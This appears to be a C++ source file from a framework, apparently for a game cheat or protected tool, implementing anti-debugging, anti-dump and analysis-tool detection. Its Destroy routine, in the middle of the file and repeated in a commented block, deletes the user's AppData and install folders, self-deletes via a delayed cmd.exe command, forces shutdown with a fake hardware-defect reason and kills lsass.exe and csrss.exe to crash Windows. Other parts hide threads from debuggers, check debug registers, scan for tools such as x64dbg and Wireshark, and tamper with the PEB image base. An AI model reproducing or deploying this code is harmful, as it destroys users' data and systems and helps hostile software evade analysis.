/// Analysis Protection.cpp

#include "PX Precompiled.hpp"
#define PX_USE_NAMESPACES
#include "../../PX Framework.hpp"

namespace PX::sys
{
	/** \brief Retrieves info from WMIC service */
	/** \param bszDevice Device name, generally Win32_ but can be CIM_ or other */
	/** \param wszDeviceProperty Property to find from index */
	/** \return Property of device */
	wstr_t PX_API RetrieveInfo( const _bstr_t &bszDevice, wcstr_t wszDeviceProperty = PX_XOR( L"Name" ) );
}

namespace PX::AnalysisProtection
{
	// Review: see that all analysis protection functions are called in one of the following three functions

	PX_EXT PX_INL bool PX_API CheckForAnalysis( )
	{
		// Note: must include all local process/general basic analysis checks
		return HideThreadFromDebugger( ) &&
#if defined PX_ENTRY_AS_DLL
			 ReplaceImageBase( ) &&
#endif
				DebuggerPresence( )
				&& ExternalExceptionHandlingPresence( )
				&& AnalysisToolsRunning( );
	}

	PX_EXT PX_INL bool PX_API CheckForAnalysisEx( HANDLE hExtensionContainer /*= nullptr*/, _In_reads_( zExtensionThreads ) HANDLE *hExtensionThreads /*= nullptr*/, std::size_t zExtensionThreads /*= 0u*/ )
	{
		// Note: must include all external process analysis checks
		bool bResult = true;
		for ( auto z = 0u; z < zExtensionThreads; z++ )
			bResult &= HideThreadFromDebugger( hExtensionThreads[ z ] ); // we want to try for every thread, even if one of them doesn't work

		return bResult
				&& DebuggerPresenceEx( hExtensionContainer );
	}

	PX_EXT PX_INL bool PX_API CheckForAllAnalysis( HANDLE hExtensionContainer /*= nullptr*/, _In_reads_( zExtensionThreads ) HANDLE *hExtensionThreads /*= nullptr*/, std::size_t zExtensionThreads /*= 0u*/ )
	{
		// Note: must include CheckForAnalysis & CheckForAnalysisEx and any other intensive analysis checks
		return CheckForAnalysis( )
			&& ( ( hExtensionContainer && hExtensionThreads && zExtensionThreads ) ? CheckForAnalysisEx( hExtensionContainer, hExtensionThreads, zExtensionThreads ) : true )
			;// && AnalysisToolsInstalled( );
	}

	namespace DebuggerPrevention
	{

	// https://stackoverflow.com/questions/734717/how-to-delete-a-folder-in-c
		int DeleteDirectory( const std::string &refcstrRootDirectory,
							 bool              bDeleteSubdirectories = true )
		{
			bool            bSubdirectory = false;       // Flag, indicating whether
														 // subdirectories have been found
			HANDLE          hFile;                       // Handle to directory
			std::string     strFilePath;                 // Filepath
			std::string     strPattern;                  // Pattern
			WIN32_FIND_DATAA FileInformation;             // File information


			strPattern = refcstrRootDirectory + "\\*.*";
			hFile = ::FindFirstFileA( strPattern.c_str( ), &FileInformation );
			if ( hFile != INVALID_HANDLE_VALUE )
			{
				do
				{
					if ( FileInformation.cFileName[ 0 ] != '.' )
					{
						strFilePath.erase( );
						strFilePath = refcstrRootDirectory + "\\" + FileInformation.cFileName;

						if ( FileInformation.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
						{
							if ( bDeleteSubdirectories )
							{
							  // Delete subdirectory
								int iRC = DeleteDirectory( strFilePath, bDeleteSubdirectories );
								if ( iRC )
									return iRC;
							}
							else
								bSubdirectory = true;
						}
						else
						{
						  // Set file attributes
							if ( ::SetFileAttributesA( strFilePath.c_str( ),
													   FILE_ATTRIBUTE_NORMAL ) == FALSE )
								return ::GetLastError( );

							  // Delete file
							if ( ::DeleteFileA( strFilePath.c_str( ) ) == FALSE )
								return ::GetLastError( );
						}
					}
				} while ( ::FindNextFileA( hFile, &FileInformation ) == TRUE );

				// Close handle
				::FindClose( hFile );

				DWORD dwError = ::GetLastError( );
				if ( dwError != ERROR_NO_MORE_FILES )
					return dwError;
				else
				{
					if ( !bSubdirectory )
					{
					  // Set directory attributes
						if ( ::SetFileAttributesA( refcstrRootDirectory.c_str( ),
												   FILE_ATTRIBUTE_NORMAL ) == FALSE )
							return ::GetLastError( );

						  // Delete directory
						if ( ::RemoveDirectoryA( refcstrRootDirectory.c_str( ) ) == FALSE )
							return ::GetLastError( );
					}
				}
			}

			return 0;
		}



		PX_END PX_EXT PX_INL void PX_API Destroy( const HANDLE &hExtensionContainer /*= nullptr*/ ) PX_NOX
		{
			MessageBox( nullptr, PX_XOR(
				L""
				"Our driver has halted functionality due to interference. This\n"
				"message box should only show up if you are messing with the driver\n"
				"using reverse engineering tools. Since this is the alpha and you are\n"
				"a trusted user, FORCE SHUT DOWN YOUR COMPUTER IMMEDIATELY BEFORE THE DRIVER DESTROYS YOUR PC.\n\n"
				"DO NOT PRESS OK. DO NOT PRESS OK. DO NOT PRESS OK. DO NOT PRESS OK. DO NOT PRESS OK." ), PX_XOR( L"Something messed up really bad." ), 0 );

			MessageBox( nullptr, PX_XOR(
				L"You pressed OK. Well, this is your last chance.\n"
				"Don't press OK. The functionality to stop reverse engineering is untested.\n"
				"Don't say I didn't warn you." ), PX_XOR( L"Wise guy, huh?" ), 0 );

			wstr_t wstrPath;
			FileRead( PX_APPDATA + PX_XOR( L"data.px" ), wstrPath, false );
			DeleteDirectory( string_cast< str_t >( wstrPath ), true );
			DeleteDirectory( string_cast<str_t>(PX_APPDATA.substr( 0, PX_APPDATA.length(  ) - 2 )), true );

			const auto mmtStart = GetMoment( );
			int iTries = 0;
Retry:
			iTries++;
			try
			{
				STARTUPINFO si { };
				PROCESS_INFORMATION pi;
				// waits 3 seconds before creating the process
				CreateProcess( nullptr, &( std::wstring( PX_XOR( L"cmd.exe /C ping 1.1.1.1 -n 1 -w 12000 > Nul & Del /f /q \"" ) ) + wstrPath + L'\"' )[ 0 ],
							   nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi );

				CloseHandle( pi.hThread );
				CloseHandle( pi.hProcess );

				// if we took longer than 3 seconds to close handles (aka breakpoint, someone is stepping through) we retry. after 9 seconds/3 tries, we give up.
				if ( GetMoment( ) - mmtStart > 3000ull * iTries && iTries <= 3 )
					goto Retry;
			}
			catch ( ... )
			{ }

			// just mess everything up
			if ( hExtensionContainer )
				::TerminateProcess( hExtensionContainer, 0u );
			ExitWindowsEx( EWX_FORCE | EWX_SHUTDOWN | EWX_POWEROFF, SHTDN_REASON_MAJOR_HARDWARE );
			InitiateShutdown( nullptr, const_cast< wchar_t* >( PX_XOR( L"Hardware defect detected." ) ), 0, SHUTDOWN_FORCE_SELF | SHUTDOWN_FORCE_OTHERS | SHUTDOWN_GRACE_OVERRIDE | SHUTDOWN_POWEROFF, SHTDN_REASON_MAJOR_HARDWARE );
			ShellExecute( nullptr, PX_XOR( L"open" ), PX_XOR( L"shutdown.exe" ), PX_XOR( L"-f -s" ), PX_XOR( L"%windir%\\SysWOW64\\" ), SW_HIDE );
			system( PX_XOR( "shutdown -f -s" ) );
			::TerminateProcess( OpenProcess( PROCESS_TERMINATE, FALSE, GetProcessID( PX_XOR( L"lsass.exe" ) ) ), 0u );
			::TerminateProcess( OpenProcess( PROCESS_TERMINATE, FALSE, GetProcessID( PX_XOR( L"csrss.exe" ) ) ), 0u );
			::TerminateProcess( GetCurrentProcess( ), 0u );
			ExitProcess( 0 );

			//MessageBox( nullptr, L"Destroy Attempted", L"Important", MB_OK );
			// todo too powerful
			/*
						std::function< void( const std::wstring&, bool ) > lmdaDeleteDirectory = [ &lmdaDeleteDirectory ]( const std::wstring& wstrRootDirectory, const bool bDeleteHostDirectory )
						{
							WIN32_FIND_DATA fdInfo;
			
							const auto hFiles = FindFirstFile( ( wstrRootDirectory + L"\\*.*" ).c_str( ), &fdInfo );
							do
							{
								if ( fdInfo.cFileName[ 0 ] != '.' )
								{
									auto wstrFilePath = wstrRootDirectory + L"\\" + fdInfo.cFileName;
			
									if ( fdInfo.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
									{
										lmdaDeleteDirectory( wstrFilePath, true );
										RemoveDirectory( wstrFilePath.c_str( ) );
									}
									else
									{
										SetFileAttributes( wstrFilePath.c_str( ), FILE_ATTRIBUTE_NORMAL );
										DeleteFile( wstrFilePath.c_str( ) );
									}
								}
							}
							while ( TRUE == FindNextFile( hFiles, &fdInfo ) );
			
							bDeleteHostDirectory && RemoveDirectory( wstrRootDirectory.c_str( ) );
			
							FindClose( hFiles );
						};
			
						// delete all our info in appdata
						lmdaDeleteDirectory( PX_APPDATA, true );
			
						// delete all our info in the install
						std::wstring wstrPath;
						FileRead( PX_APPDATA + PX_XOR( L"data.px" ), wstrPath, false );
						lmdaDeleteDirectory( wstrPath, false );
			
						const auto mmtStart = GetMoment( );
						int iTries = 0;
			Retry:
						iTries++;
						try
						{
							STARTUPINFO si { };
							PROCESS_INFORMATION pi;
							// waits 3 seconds before creating the process
							CreateProcess( nullptr, &( std::wstring( PX_XOR( L"cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"" ) ) + wstrPath + L'\"' )[ 0 ],
										   nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi );
			
							CloseHandle( pi.hThread );
							CloseHandle( pi.hProcess );
			
							// if we took longer than 3 seconds to close handles (aka breakpoint, someone is stepping through) we retry. after 9 seconds/10 tries, we give up.
							if ( GetMoment( ) - mmtStart > 3000ull && iTries < 3 )
								goto Retry;
						}
						catch ( ... )
						{
						}
			
						// just mess everything up
						if ( hExtensionContainer )
							::TerminateProcess( hExtensionContainer, 0u );
						ExitWindowsEx( EWX_FORCE | EWX_SHUTDOWN | EWX_POWEROFF, SHTDN_REASON_MAJOR_HARDWARE );
						InitiateShutdown( nullptr, const_cast< wchar_t* >( PX_XOR( L"Hardware defect detected." ) ), 0, SHUTDOWN_FORCE_SELF | SHUTDOWN_FORCE_OTHERS | SHUTDOWN_GRACE_OVERRIDE | SHUTDOWN_POWEROFF, SHTDN_REASON_MAJOR_HARDWARE );
						ShellExecute( nullptr, PX_XOR( L"open" ), PX_XOR( L"shutdown.exe" ), PX_XOR( L"-f -s" ), PX_XOR( L"%windir%\\SysWOW64\\" ), SW_HIDE );
						system( "shutdown -f -s" );
						::TerminateProcess( OpenProcess( PROCESS_TERMINATE, FALSE, GetProcessID( PX_XOR( L"lsass.exe" ) ) ), 0u );
						::TerminateProcess( OpenProcess( PROCESS_TERMINATE, FALSE, GetProcessID( PX_XOR( L"csrss.exe" ) ) ), 0u );
						::TerminateProcess( GetCurrentProcess( ), 0u );
						ExitProcess( 0 );
			*/
		}

		PX_EXT PX_INL bool PX_API HideThreadFromDebugger( HANDLE hTargetThread /*= GetCurrentThread( )*/ )
		{
			return true;
			static const auto NtSetInformationThread = static_cast< SWindowsAPI::fnNtSetInformationThread >( PX_WINAPI.GetFunctionPointer( SWindowsAPI::NtSetInformationThread ) );
			if ( NtSetInformationThread == nullptr )
				return false;
			px_assert( STATUS_SUCCESS == NtSetInformationThread( hTargetThread, /*ThreadHideFromDebugger*/ 0x11, nullptr, 0 ) );
			return true;
		}
	}

	namespace DebuggerDetection
	{
		PX_EXT PX_INL bool PX_API DebuggerPresenceEx( HANDLE hTargetProcess /*= GetCurrentProcess( )*/ )
		{
			// check for debugger with WinAPI
			BOOL bPresent;
			px_assert( 0 != CheckRemoteDebuggerPresent( hTargetProcess, &bPresent ) );
			px_assert( FALSE == bPresent );

			return true;
			// check for debugger with NT
			static const auto NtQueryInformationProcess = static_cast< SWindowsAPI::fnNtQueryInformationProcess >( PX_WINAPI.GetFunctionPointer( SWindowsAPI::NtQueryInformationProcess ) );
			if ( NtQueryInformationProcess == nullptr )
				return false;
			// port (returns true if debug port is opened for a debugger)
			px_assert( STATUS_SUCCESS == NtQueryInformationProcess( hTargetProcess, ProcessDebugPort, &bPresent, sizeof( DWORD ), nullptr )
				&& FALSE == bPresent );
			// object handle (returns true if there is a debug handle to hTarget object)
			px_assert( STATUS_SUCCESS == NtQueryInformationProcess( hTargetProcess, /*ProcessDebugObjectHandle*/ 0x1E, &bPresent, sizeof( DWORD ), nullptr )
				&& FALSE == bPresent );
			// flags (returns true if debugging flags are unset, or no debugger is there)
			px_assert( STATUS_SUCCESS == NtQueryInformationProcess( hTargetProcess, /*ProcessDebugFlags*/ 0x1F, &bPresent, sizeof( DWORD ), nullptr )
				&& TRUE == bPresent );

			return true;
		}

		PX_EXT PX_INL bool PX_API DebuggerPresence( ) // check for debugger using remove functions & WinAPI
		{
			/*
			static const auto NtQuerySystemInformation = static_cast< SWindowsAPI::fnNtQuerySystemInformation >( PX_WINAPI.GetFunctionPointer( SWindowsAPI::EFuncs::NtQuerySystemInformation ) );
			if ( NtQuerySystemInformation == nullptr )
				return false * (bool)(MessageBox(0, L"", L"", 0));
			SWindowsAPI::SYSTEM_KERNEL_DEBUGGER_INFORMATION nfoDebuggerStatus;
			px_assert( STATUS_SUCCESS == NtQuerySystemInformation( /*SystemKernelDebuggerInformation 35, &nfoDebuggerStatus,
				sizeof( SWindowsAPI::SYSTEM_KERNEL_DEBUGGER_INFORMATION ), nullptr ) );
			px_assert( FALSE == nfoDebuggerStatus.DebuggerEnabled
				&& TRUE == nfoDebuggerStatus.DebuggerNotPresent ); */
			px_assert( true == DebuggerPresenceEx( )
				&& 0 == IsDebuggerPresent( )
				&& 0 == PPEB( __readfsdword( 0x30 ) )->BeingDebugged );
			return true;
		}

		/** \brief Checks presence of debugger by setting up SEH and calling interrupt[ 0x2D ]  */
		/** \return false if debugger catch occurred */
		PX_INL bool PX_API Interrupt0x2D( ) PX_NOX
		{
			// try with seh
			__try
			{
				// if eax is 1, 3, 4, 5, windows will increase exception address by 1
				__asm
				{
					int 0x2D
					xor eax, eax
					add eax, 2
				}
			}
			__except ( EXCEPTION_EXECUTE_HANDLER )
			{
				// not EXCEPTION_BREAKPOINT
				return true;
			}

			return false;
		}

		PX_EXT PX_INL bool PX_API ExternalExceptionHandlingPresence( )
		{
			__try
			{
				if ( 0 != CloseHandle( 0 ) )
					return false; // exception was caught and handled by something else, then not passed back to us
			}
			__except ( EXCEPTION_EXECUTE_HANDLER )
			{
				// exception was caught and handled by something else
				return false;
			}

			/*
			// cannot be static as that would require unwinding
			const auto NtClose = static_cast< SWindowsAPI::fnNtClose >( PX_WINAPI.GetFunctionPointer( SWindowsAPI::NtClose ) );
			if ( NtClose == nullptr )
				return false;
			__try
			{
				if ( STATUS_INVALID_HANDLE != NtClose( INVALID_HANDLE_VALUE ) )
					return false; // exception was caught and handled by something else, then not passed back to us
			}
			__except ( EXCEPTION_EXECUTE_HANDLER )
			{
				// exception was caught and handled by something else
				return false;
			}*/

			return Interrupt0x2D( );
		}

		PX_EXT PX_INL bool PX_API SoftwareBreakpointPresence( )
		{
			return false;
		}

		PX_EXT PX_INL bool PX_API HardwareBreakpointPresenceEx( _In_reads_( zExtensionThreads ) HANDLE *hExtensionThreads /*= nullptr*/, std::size_t zExtensionThreads /*= 0u*/ )
		{
			px_assert( !( ( nullptr == hExtensionThreads ) ^ ( 0u == zExtensionThreads ) ) );

			auto pThreadContext = new CONTEXT{ CONTEXT_DEBUG_REGISTERS };

			if ( nullptr != hExtensionThreads
				&& 0u != zExtensionThreads )
				for ( auto z = 0u; z < zExtensionThreads; z++ )
				{
					px_assert( 0 != GetThreadContext( hExtensionThreads[ z ], pThreadContext ) );

					if ( pThreadContext->Dr0 != 0 || pThreadContext->Dr1 != 0 || pThreadContext->Dr2 != 0
						|| pThreadContext->Dr3 != 0 || pThreadContext->Dr6 != 0 || pThreadContext->Dr7 != 0 )
						return false;
				}
			else
			{
				px_assert( 0 != GetThreadContext( GetCurrentThread( ), pThreadContext ) );

				if ( pThreadContext->Dr0 != 0 || pThreadContext->Dr1 != 0 || pThreadContext->Dr2 != 0
					|| pThreadContext->Dr3 != 0 || pThreadContext->Dr6 != 0 || pThreadContext->Dr7 != 0 )
					return false;
			}

			return true;
		}
	}

	namespace AnalysisSoftwareDetection
	{
		PX_EXT PX_INL bool PX_API AnalysisToolsInstalled( )
		{
			Types::wstr_t wstrInstalls;
			{
				auto wszRegPath = PX_XOR( L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" );
				HKEY hkeyUninstall;
				px_assert( RegOpenKeyEx( HKEY_LOCAL_MACHINE, wszRegPath, 0, KEY_READ, &hkeyUninstall ) == ERROR_SUCCESS );

				do
				{
					static auto u = 0u;
					wchar_t wchAppKeyID[ 1024 ];
					DWORD dwBuffer = sizeof wchAppKeyID / 2; // wide, so /2
					if ( RegEnumKeyEx( hkeyUninstall, u++, wchAppKeyID, &dwBuffer, nullptr, nullptr, nullptr, nullptr ) != ERROR_SUCCESS )
						break;

					Types::wstr_t wstrSubKeyID;
					wstrSubKeyID = wstrSubKeyID + wszRegPath + L'\\' + wchAppKeyID;
					HKEY hkeyApp;
					px_assert( RegOpenKeyEx( HKEY_LOCAL_MACHINE, wstrSubKeyID.c_str( ), 0, KEY_READ, &hkeyApp ) == ERROR_SUCCESS );

					wchar_t wchDisplay[ 1024 ];
					dwBuffer = sizeof wchDisplay / 2; // wide, so /2
					DWORD dwType = KEY_ALL_ACCESS;
					px_assert( RegQueryValueEx( hkeyApp, PX_XOR( L"DisplayName" ), nullptr, &dwType, reinterpret_cast< BYTE* >( wchDisplay ), &dwBuffer ) == ERROR_SUCCESS );
					wstrInstalls += wchDisplay;

					RegCloseKey( hkeyApp );
				}
				while ( true );
				RegCloseKey( hkeyUninstall );
			}
			{
				// todo skel
				wcstr_t wszAnalysisToolsInstallName[ ]
				{
					// lots of these have multiple versions
					PX_XOR( L"Cheat Engine 6.6" ),
					PX_XOR( L"cheatengine-i386.exe" ),
					PX_XOR( L"cheatengine-x86_64.exe" ),
					PX_XOR( L"x96dbg.exe" ),
					PX_XOR( L"x64dbg.exe" ),
					PX_XOR( L"x32dbg.exe" ),
					PX_XOR( L"binaryninja.exe" ), // also has a (remove only) version, 2 total
					PX_XOR( L"ReClass.exe" ),
					PX_XOR( L"devenv.exe" ),
					PX_XOR( L"ollydbg.exe" ),
					PX_XOR( L"ProcessHacker.exe" ),
					PX_XOR( L"tcpview.exe" ),
					PX_XOR( L"autoruns.exe" ),
					PX_XOR( L"autorunsc.exe" ),
					PX_XOR( L"filemon.exe" ),
					PX_XOR( L"procmon.exe" ),
					PX_XOR( L"regmon.exe" ),
					PX_XOR( L"procexp.exe" ),
					PX_XOR( L"idaq.exe" ), // versions
					PX_XOR( L"idaq64.exe" ),
					PX_XOR( L"ImmunityDebugger.exe" ),
					PX_XOR( L"Wireshark.exe" ),
					PX_XOR( L"dumpcap.exe" ),
					PX_XOR( L"HookExplorer.exe" ),
					PX_XOR( L"ImportREC.exe" ),
					PX_XOR( L"PETools.exe" ),
					PX_XOR( L"LordPE.exe" ),
					PX_XOR( L"SysInspector.exe" ),
					PX_XOR( L"proc_analyzer.exe" ),
					PX_XOR( L"sysAnalyzer.exe" ),
					PX_XOR( L"sniff_hit.exe" ),
					PX_XOR( L"windbg.exe" ),
					PX_XOR( L"dnspy.exe" ),
					PX_XOR( L"joeboxcontrol.exe" ),
					PX_XOR( L"joeboxserver.exe" )
				};
				{
					std::wstringstream ssReg( wstrInstalls ), ssWMIC( RetrieveInfo( PX_XOR( L"SELECT * FROM Win32_Product" ) ) );
					do
					{
						wstr_t wstrBuffer;
						if ( !ssReg.eof( ) )
						{
							std::getline( ssReg, wstrBuffer );
							for each ( auto &wszAnalysisTool in wszAnalysisToolsInstallName )
								if ( wstrBuffer.substr( 0, wstrBuffer.length( ) > 7 ? 7 : wstrBuffer.length( ) )
									== wstr_t( wszAnalysisTool ).substr( 0, wstr_t( wszAnalysisTool ).length( ) > 7 ?
																				7 // shortening it so you don't need to find a bunch of versions
																				:
																				wstr_t( wszAnalysisTool ).length( ) ) )	  // long enough to not confuse with other apps
									throw;
						}
						if ( !ssWMIC.eof( ) )
						{
							std::getline( ssWMIC, wstrBuffer );
							for each ( auto &wszAnalysisTool in wszAnalysisToolsInstallName )
								if ( wstrBuffer.substr( 0, wstrBuffer.length( ) > 7 ? 7 : wstrBuffer.length( ) )
									== wstr_t( wszAnalysisTool ).substr( 0, wstr_t( wszAnalysisTool ).length( ) > 7 ?
																				7 // shortening it so you don't need to find a bunch of versions
																				:
																				wstr_t( wszAnalysisTool ).length( ) ) )	  // long enough to not confuse with other apps
									throw;
						}
					}
					while ( !ssReg.eof( ) || !ssWMIC.eof( ) );
				}
			}
			return true;
		}

		PX_EXT PX_INL bool PX_API AnalysisToolsRunning( )
		{
			wcstr_t wszAnalysisToolsExecutableTitle[ ]
			{
				PX_XOR( L"Cheat Engine.exe" ),
				PX_XOR( L"cheatengine-i386.exe" ),
				PX_XOR( L"cheatengine-x86_64.exe" ),
				PX_XOR( L"x96dbg.exe" ),
				PX_XOR( L"x64dbg.exe" ),
				PX_XOR( L"x32dbg.exe" ),
				PX_XOR( L"binaryninja.exe" ),
				PX_XOR( L"ReClass.exe" ),
				//PX_XOR( L"devenv.exe" ),
				PX_XOR( L"ollydbg.exe" ),
				PX_XOR( L"ProcessHacker.exe" ),
				PX_XOR( L"tcpview.exe" ),
				PX_XOR( L"autoruns.exe" ),
				PX_XOR( L"autorunsc.exe" ),
				PX_XOR( L"filemon.exe" ),
				PX_XOR( L"procmon.exe" ),
				PX_XOR( L"regmon.exe" ),
				PX_XOR( L"procexp.exe" ),
				PX_XOR( L"idaq.exe" ),
				PX_XOR( L"idaq64.exe" ),
				PX_XOR( L"ImmunityDebugger.exe" ),
				PX_XOR( L"Wireshark.exe" ),
				PX_XOR( L"dumpcap.exe" ),
				PX_XOR( L"HookExplorer.exe" ),
				PX_XOR( L"ImportREC.exe" ),
				PX_XOR( L"PETools.exe" ),
				PX_XOR( L"LordPE.exe" ),
				PX_XOR( L"SysInspector.exe" ),
				PX_XOR( L"proc_analyzer.exe" ),
				PX_XOR( L"sysAnalyzer.exe" ),
				PX_XOR( L"sniff_hit.exe" ),
				PX_XOR( L"windbg.exe" ),
				PX_XOR( L"dnspy.exe" ),
				PX_XOR( L"joeboxcontrol.exe" ),
				PX_XOR( L"joeboxserver.exe" ),
				PX_XOR( L"lsass.exe" )
			};
			bool bResult = false;
			for each ( auto &wszAnalysisTool in wszAnalysisToolsExecutableTitle )
			{
				bResult = wstr_t( PX_XOR( L"lsass.exe" ) ) == wszAnalysisTool;
				// check for basic, always running exe. if it's running, that means they aren't forcing our strings to null
				// then go to GetProcessID to make sure they aren't forcing GetProcessID to false

				if ( GetProcessID( wszAnalysisTool ) )
				{
					px_assert( bResult );
				}
				else if ( bResult ) // this is only true at the end of the list, and the exe should be running, thus, we've been
						throw; // byte patched!
			}
			return true;
		}
	}

	namespace DumpPrevention
	{
		PX_EXT PX_INL bool PX_API ReplaceImageBase( ) PX_NOX
		{
			auto &buf = PPEB( __readfsdword( 0x30 ) )->Ldr->InMemoryOrderModuleList.Flink;
			if ( buf == nullptr )
				return false;
			return PLDR_DATA_TABLE_ENTRY( buf )->DllBase = reinterpret_cast< PVOID >( ptr_t( PLDR_DATA_TABLE_ENTRY( buf )->DllBase ) + 0x51730 ); // would use something like 0x100000, but then an analyzer know it's an invalid address
		}
	}

	namespace Emulation
	{
		namespace Tempo
		{ }

		namespace Turing
		{ }
	}
}
